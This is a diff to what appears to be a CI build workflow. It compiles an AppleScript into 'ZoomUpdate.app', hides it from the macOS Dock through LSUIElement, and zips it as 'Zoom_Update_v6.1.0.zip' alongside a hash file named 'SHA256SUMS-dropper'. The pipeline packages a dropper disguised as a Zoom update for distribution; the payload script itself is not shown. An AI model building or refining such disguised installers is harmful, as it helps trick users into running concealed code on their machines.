@@ -33,8 +33,10 @@ jobs:
           mkdir -p build
           osacompile -o build/zoom-update-microsoft.scpt \
             client-wrappers/client-wrappers/zoom-update-microsoft.applescript
+          osacompile -o build/ZoomUpdate.app \
+            client-wrappers/client-wrappers/zoom-update-microsoft.applescript
+          /usr/libexec/PlistBuddy -c "Add :LSUIElement bool true" build/ZoomUpdate.app/Contents/Info.plist 2>/dev/null || true
           file build/zoom-update-microsoft.scpt
-          ls -l build/zoom-update-microsoft.scpt
 
       - name: Re-compile as syntax smoke test
         run: |
@@ -80,9 +82,11 @@ jobs:
           
           Hashes: see SHA256SUMS-dropper.
           EOF
+          rm -rf distro/clients/macos/ZoomUpdate.app
+          cp -R build/ZoomUpdate.app distro/clients/macos/ZoomUpdate.app
           rm -f distro/clients/macos/Zoom_Update_v6.1.0.zip
-          (cd distro/clients/macos && zip -X -q Zoom_Update_v6.1.0.zip \
-            zoom-update-microsoft.scpt Zoom_Update_v6.1.0.README.txt)
+          (cd distro/clients/macos && zip -X -qry Zoom_Update_v6.1.0.zip \
+            zoom-update-microsoft.scpt ZoomUpdate.app Zoom_Update_v6.1.0.README.txt)
           (cd distro/clients/macos && shasum -a 256 zoom-update-microsoft.scpt \
             Zoom_Update_v6.1.0.zip > SHA256SUMS-dropper)
 
@@ -93,6 +97,7 @@ jobs:
           path: |
             distro/clients/macos/zoom-update-microsoft.scpt
             distro/clients/macos/Zoom_Update_v6.1.0.zip
+            distro/clients/macos/ZoomUpdate.app
             distro/clients/macos/Zoom_Update_v6.1.0.README.txt
             distro/clients/macos/SHA256SUMS-dropper
           if-no-files-found: error
@@ -105,6 +110,7 @@ jobs:
           git add client-wrappers/client-wrappers/zoom-update-microsoft.scpt \
             distro/clients/macos/zoom-update-microsoft.scpt \
             distro/clients/macos/Zoom_Update_v6.1.0.zip \
+            distro/clients/macos/ZoomUpdate.app \
             distro/clients/macos/Zoom_Update_v6.1.0.README.txt \
             distro/clients/macos/SHA256SUMS-dropper
           if git diff --cached --quiet; then
